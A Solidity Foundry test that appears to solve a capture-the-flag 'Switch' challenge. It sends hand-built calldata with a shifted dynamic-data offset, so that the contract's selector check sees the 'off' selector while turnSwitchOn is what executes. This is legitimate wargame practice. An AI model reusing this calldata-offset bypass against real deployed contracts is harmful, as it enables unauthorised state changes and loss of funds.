// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Switch} from "src/Switch.sol";

contract SwitchTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("GOERLI_RPC_URL"));
    }

    function test_Switch() public {
        Switch sw = new Switch();
        address(sw).call(
            abi.encodePacked(
                sw.flipSwitch.selector, abi.encode(0x60, 4, sw.offSelector(), 4, Switch.turnSwitchOn.selector)
            )
        );
        assertTrue(sw.switchOn());
    }
}
